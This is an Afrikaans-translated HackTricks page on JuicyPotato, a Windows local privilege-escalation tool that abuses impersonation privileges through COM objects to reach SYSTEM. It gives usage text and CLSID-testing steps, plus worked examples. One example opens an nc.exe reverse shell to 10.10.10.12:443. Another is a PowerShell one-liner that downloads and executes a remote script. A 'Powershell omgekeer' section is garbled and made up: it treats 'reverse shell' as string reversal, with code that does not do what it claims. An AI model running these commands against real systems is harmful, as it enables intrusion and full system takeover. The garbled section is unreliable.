# JuicyPotato

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato werk nie** op Windows Server 2019 en Windows 10-bou 1809 en later nie. Tog kan [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) gebruik word om dieselfde voorregte te benut en `NT AUTHORITY\SYSTEM`-vlaktoegang te verkry. _**Kyk:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (misbruik van die goud-voorregte) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_'n Gesuikerde weergawe van_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, met 'n bietjie sap, d.w.s. **'n ander plaaslike voorregverhogingsinstrument, vanaf 'n Windows-diensrekening na NT AUTHORITY\SYSTEM**_

#### Jy kan juicypotato aflaai vanaf [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Opsomming <a href="#summary" id="summary"></a>

**[Vanaf juicy-potato Readme](https://github.com/ohpe/juicy-potato/blob/master/README.md):**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) en sy [variant](https://github.com/decoder-it/lonelypotato) maak gebruik van die voorregverhogingsketting gebaseer op [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [diens](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) met die MiTM-luisteraar op `127.0.0.1:6666` en wanneer jy `SeImpersonate` of `SeAssignPrimaryToken`-voorregte het. Tydens 'n Windows-bouhersiening het ons 'n opset gevind waar `BITS` opsetlik gedeaktiveer is en poort `6666` geneem is.

Ons het besluit om [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) te bewapen: **Sê hallo vir Juicy Potato**.

> Vir die teorie, sien [Rotten Potato - Voorregverhoging vanaf diensrekeninge na SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) en volg die ketting van skakels en verwysings.

Ons het ontdek dat daar, behalwe `BITS`, 'n paar COM-bedienerse is wat ons kan misbruik. Hulle moet net:

1. installeerbaar wees deur die huidige gebruiker, normaalweg 'n "diensgebruiker" wat impersonasievoorregte het
2. die `IMarshal`-koppelvlak implementeer
3. uitgevoer word as 'n verhoogde gebruiker (SYSTEM, Administrator, ...)

Na 'n paar toetse het ons 'n uitgebreide lys van [interessante CLSID's](http://ohpe.it/juicy-potato/CLSID/) op verskeie Windows-weergawes verkry en getoets.

### Sappige besonderhede <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato stel jou in staat om te:

* **Teiken CLSID** _kies enige CLSID wat jy wil._ [_Hier_](http://ohpe.it/juicy-potato/CLSID/) _kan jy die lys vind wat georganiseer is volgens bedryfstelsel._
* **COM-luisterpoort** _definieer die COM-luisterpoort wat jy verkies (in plaas van die gemarshalleerde hardgekodifiseerde 6666)_
* **COM-luister-IP-adres** _bind die bediener aan enige IP_
* **Proseskeuringsmodus** _afhangende van die impersonasievoorregte van die geïmpersonaliseerde gebruiker kan jy kies uit:_
* `CreateProcessWithToken` (benodig `SeImpersonate`)
* `CreateProcessAsUser` (benodig `SeAssignPrimaryToken`)
* `beide`
* **Proses om te begin** _begin 'n uitvoerbare lêer of skripsie as die uitbuiting slaag_
* **Prosesargument** _pas die beginproses-argumente aan_
* **RPC-bedieneradres** _vir 'n sluipende benadering kan jy aanmeld by 'n eksterne RPC-bediener_
* **RPC-bedienerpoort** _nuttig as jy wil aanmeld by 'n eksterne bediener en die vuurmuur poort `135` blokkeer..._
* **TOETS-modus** _hoofsaaklik vir toetsdoeleindes, d.w.s. toets CLSID's. Dit skep die DCOM en druk die gebruiker van token. Sien_ [_hier vir toetsing_](http://ohpe.it/juicy-potato/Test/)

### Gebruik <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Finale gedagtes <a href="#finale-gedagtes" id="finale-gedagtes"></a>

**[Van juicy-potato Readme](https://github.com/ohpe/juicy-potato/blob/master/README.md#finale-gedagtes):**

As die gebruiker `SeImpersonate` of `SeAssignPrimaryToken` voorregte het, is jy **SYSTEM**.

Dit is byna onmoontlik om die misbruik van al hierdie COM-bediener te voorkom. Jy kan dalk dink om die toestemmings van hierdie voorwerpe te wysig deur middel van `DCOMCNFG`, maar sterkte daarmee, dit gaan uitdagend wees.

Die werklike oplossing is om sensitiewe rekeninge en toepassings wat onder die `* SERVICE` rekeninge loop, te beskerm. Om `DCOM` te stop sal beslis hierdie uitbuiting inhibeer, maar dit kan 'n ernstige impak hê op die onderliggende bedryfstelsel.

Van: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Voorbeelde

Let op: Besoek [hierdie bladsy](https://ohpe.it/juicy-potato/CLSID/) vir 'n lys van CLSIDs om te probeer.

### Kry 'n nc.exe omgekeerde dopshell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell omgekeer

Die Powershell omgekeer (rev) is 'n nuttige tegniek wat gebruik kan word in 'n verskeidenheid van situasies. Dit behels die omkeer van 'n teksstring sodat die karakters in die string in omgekeerde volgorde verskyn.

Hier is 'n voorbeeld van hoe die Powershell omgekeer gebruik kan word:

```powershell
$string = "Hello, world!"
$reversedString = $string.ToCharArray() -join "" -replace "(.)", '$1 '
$reversedString.TrimEnd()
```

In hierdie voorbeeld word die teksstring "Hello, world!" omgekeer deur dit in 'n tekenreeks van karakters te verdeel, die karakters in omgekeerde volgorde te sorteer en dan weer saam te voeg. Die uiteindelike omgekeerde teksstring is "dlrow ,olleH".

Die Powershell omgekeer kan nuttig wees vir verskeie doeleindes, soos die versteekte versleuteling van teks, die omkeer van URL's of die manipulasie van teksgebaseerde data. Dit is 'n handige tegniek om in jou gereedskapskas te hê as 'n professionele hacker.
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Begin 'n nuwe CMD (as jy RDP-toegang het)

![](<../../.gitbook/assets/image (37).png>)

## CLSID Probleme

Dikwels werk die verstek CLSID wat JuicyPotato gebruik **nie** en misluk die uitbuiting. Gewoonlik neem dit verskeie pogings om 'n **werkende CLSID** te vind. Om 'n lys van CLSIDs te kry om te probeer vir 'n spesifieke bedryfstelsel, moet jy hierdie bladsy besoek:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Kontroleer CLSIDs**

Eerstens sal jy 'n paar uitvoerbare lêers benodig, afgesien van juicypotato.exe.

Laai [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) af en laai dit in jou PS-sessie, en laai [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) af en voer dit uit. Daardie skrip sal 'n lys moontlike CLSIDs skep om te toets.

Laai dan [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat) af (verander die pad na die CLSID-lys en na die juicypotato-uitvoerbare lêer) en voer dit uit. Dit sal begin om elke CLSID te probeer, en **wanneer die poortnommer verander, beteken dit dat die CLSID gewerk het**.

**Kontroleer** die werkende CLSIDs **met die parameter -c**

## Verwysings
* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PRs in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
